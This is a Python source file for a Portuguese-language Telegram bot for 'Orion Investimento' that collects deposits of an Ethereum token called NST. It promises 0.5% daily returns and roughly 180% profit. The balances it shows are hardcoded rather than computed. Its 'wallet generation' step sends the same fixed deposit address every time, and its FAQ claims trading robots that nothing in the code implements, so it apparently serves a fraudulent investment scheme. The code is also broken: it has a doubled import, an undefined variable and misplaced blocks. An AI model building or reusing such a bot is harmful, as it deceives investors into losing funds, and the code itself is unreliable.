import import telebot

from time import sleep
import conts

from database import db, insert_wallet, user_exist, insert_deposito, insert_saque, create_user

#INSTANCIA MAPEAMENTO SEM CRIAR TABELAS
db.bind(provider='sqlite', filename='database.sqlite')
db.generate_mapping()

#API DO BOT COM TELEGRAM
bot = telebot.TeleBot(conts.API_TOKEN)


x=2000.00000000
Salcon=--(-x+x)#+(0.5/100)

#INICIO DO BOT/ BOTÕES E DATABASE
@bot.message_handler(commands=['start'])
def handle_start (message):
    if not user_exist(message.from_user.id):
        create_user(message.from_user.id, message.chat.id, message.from_user.first_name, carteira="")
    #BOTÕES DO BOT
    user_markup = telebot.types.ReplyKeyboardMarkup(True, True)
    user_markup.row(' NST  {:.8f} '.format(Salcon))
    user_markup.row('Iniciar', 'Deposito')
    user_markup.row('Wallet NST', 'Saque', 'Suporte')
    user_markup.row('Ajuda')
    bot.send_message(message.from_user.id, 'Seu cadastro foi criado com sucesso! \n'
                                           ' Seja, Bem vindo {} ! ao melhor Bot de investimento.'.format(message.from_user.first_name), reply_markup=user_markup)

#COMANDO DA CARTEIRA
@bot.message_handler(content_types=["text"])
def wallet(message, user_markup=None):
    if message.text == 'Wallet NST':
        sent=bot.send_message(message.chat.id, """Cripto moeda é um token Ethereum.
O endereço do token do contrato inteligente de NST é o seguinte:
(0xD89040Ac9823B72F64d71f66Fa2DeAE7C8520671).
Por favor certifique-se que está a utilizar o contrato inteligente correto ou os seus fundos poderão perder-se irremediavelmente! \n
INFORME A SUA CARTEIRA NST(NEW SOLUTION ) :""")
        bot.register_next_step_handler(sent, add_wallet)

def add_wallet(msg):
    carteira = (msg.text)
    carteira = carteira.replace(' ', '')
    insert_wallet(msg.from_user.id, carteira)
    bot.reply_to(msg, "Carteira adicionada com sucesso!")


#COMANDO DA CONTA DO CLIENTE   
@bot.message_handler(commands=['Iniciar'])
def inicializar(message):
    bot.send_message(message.from_user.id, """"CONTA DO CLIENTE""" '\n'
                    '\n'
                    """ Saldo em conta """ '\n'  # valor de rendimento diario
                    """ NST:""" + str(float(Salcon)) + '\n' +  # (saldo_investido*0.5/100)aumente 0.5% todos dias apos 24hrs com base no valor investido
                    '\n'
                    """ Saldo Investido"""'\n'  # deposito
                    """ NST:""" + str(float(x)) + '\n'  # quantidade de moedas depositadas
                    '\n'
                    """ Saldo Sacado """ '\n'
                    """ NST: 0.00000000 """)

    

#COMANDO DE DEPOSITO
@bot.message_handler(content_types=["text"])
def deposito (message, user_markup=None):
    if message.text == 'Deposito':
        bot.send_message(message.from_user.id,"""A Cripto moeda é um token Ethereum.\n Por favor, transfira para este endereço apenas moeda NST. Depósitos de outras moedas neste endereço perderão!\n O valor mínimo para depósito é 2000 NST.\n O endereço do token do contrato inteligente de NST é o seguinte :\n 0xD89040Ac9823B72F64d71f66Fa2DeAE7C8520671.\n Por favor certifique-se que está a utilizar o contrato inteligente correto ou os seus fundos poderão perder-se irremediavelme""")
        bot.send_message(message.from_user.id, 'Qual o valor do seu deposito, lembrando que o minimo é de 2000 NST.')
        total_deposito = message.text
        insert_deposito(msg.from_user.id, total_deposito)
         """if message.text == total_deposito >= (conts.minimo_deposito):
                bot.send_message(message.from_user.id, 'O SEU DEPOSITO FOI REALIZADO COM SUCESSO!.')
            else:
                bot.send_message(message.from_user.id, 'O VALOR PARA DEPOSITO NÃO É PERMITIDO. ')"""
        bot.send_message(message.from_user.id, 'Por favor aguarde um minuto estamos gerando sua carteira : ')
        sleep(2)
        bot.send_message(message.from_user.id, '0x96036e644b9968adb299e12f8ef3acf157ab8bb1')



#COMANDO DE SAQUE
@bot.message_handler(content_types=["text"])
def saque(message, user_markup=None):
    if message.text == 'Saque':
        bot.send_message(message.from_user.id, """Cripto moeda é um token Ethereum.
O endereço do token do contrato inteligente de NST é o seguinte:
(0xD89040Ac9823B72F64d71f66Fa2DeAE7C8520671).
Por favor certifique-se que está a utilizar o contrato inteligente correto ou os seus fundos poderão perder-se irremediavelmente! """)
        bot.send_message(message.from_user.id,""" INFORME A QUANTIDADE DE NST :(valores inteiros)
(LEMBRANDO O MINIMO PARA SAQUE É DE 1500NST) """)
        total_saque = message.text
        insert_saque(msg.from_user.id, total_saque)
           """if message.text == str(Salcon) >= (conts.minimo_saque):
                bot.send_message(message.from_user.id, 'O SEU SAQUE FOI SOLICITADO COM SUCESSO!!! , \n PRAZO DE PAGAMENTO DE ÁTE D+05 ÚTEIS.')
            else:
                bot.send_message(message.from_user.id, 'O valor de saquer é menor que o permetido. ')"""
        sleep(1)
        bot.send_message(message.from_user.id,'OBRIGADO POR CONFIAR NA ORION INVESTIMENTO VIEMOS COM PRINCIPAL OBJETIVO AJUDA A TODOS VOCÊS.')


#COMANDO DE SUPORTE E AJUDA    
@bot.message_handler(content_types=["text"])
def suporte (message, user_markup=None):
    if message.text == 'Suporte':
        bot.send_message(message.from_user.id,""" Agora você tem contato direto com o nosso suporte.
Basta você ta enviando um email para
(suporte.orion@gmail.com),
o administrador a receberá e enviarar uma resposta brevemente. 
obrigado pela atenção e bons investimetno""")

    elif message.text == 'Ajuda':
        bot.send_message(message.from_user.id, """ 
Planos de investimento:
0.5% diariamente até 365 dia
MINIMO DE DEPOSITO: 2000 NST
Pagamentos: MANUAL
MINIMO PARA SAQUE: 1500 NST
(https://newsolution.com/)
 \n
Como é feito os depositos ?
São feito todos em NST para uma deposito de token erc20
COM MINIMO DE 2000 NST, valores menores serão considerado perdidos.
 \n
Como ocorrer a rentabilização?
São feitos operações semanalmente de segunda a sexta, direto no mercado de cripto moedas como Day trader e Arbitragem.
\n
Como podemos ta ganhando por indicação?
 Nosso sistema não gera ganhos por referidos somente ganhos com investimeto direto no mercado com nossos melhoes robos.
\n
 Com quantos tempo recebor minhas NST após solicitar o saque?
Os pagamento ocorrer no prazo de D+05 úteis, com uma taxa de 3% DE SAQUE.(TAXA DE REDE PARA ENVIAR POR CONTA DO CLIENTE)
\n
Quais nossos objetivos ?
Nosso objetivo é nada mais nada menos que ajuda a todos a ter muitos lucros, pois quanto mais geramos lucros para vocês
mais nos ganhamos. Então nosso objetivo é fazer com o maxímo de transparência e clareza para você afiliado ganha muito, por nos
da esse voto e mostra que nem todos bot de investimento é scamm.
 \n
Por quanto tempo a Orion vai ta me pagando ? e quanto vou ter de lucro?
A Orion ira te paga 0.5% diariamente com rentabilidade em NST para em pro de facilidade e melhora a valorização da moeda
no mercado, então o tempo quem vai dizer é você investido ate quando você ira acredita no nosso trabalho e sobre lucro isso e muito
variavel quanto vai ta rebendo mais o certo no final de tudo ta lucrando 180%.
\n
Sempre quando for sacar vou ter que informar meus dados ?
Sim, sempre tera que informa seus dados, assim você ganha uma maior facilicadade com uso de carteiras blockchain.
\n
Por que tenho que fazer o envio da Hash de transação ?
Para ta ajudando a prova que você fez o envio para Orion Investimento, so iremos contabilizar o investiemto com Hash,
caso não faça o envio da hash por esquecer ou não saber entrar em contato atraves do suporte.
 \n
Tenho mais duvida como posso ta sabendo mais sobre Orion Investimento?\n
Entre em contato com nos atraves do nosso email                        
(suporte.orion@gmail.com), mande sua pergunta que estaremos respondendo o mais rapido possivel.""")


print('em execução...')
bot.polling(none_stop=True)

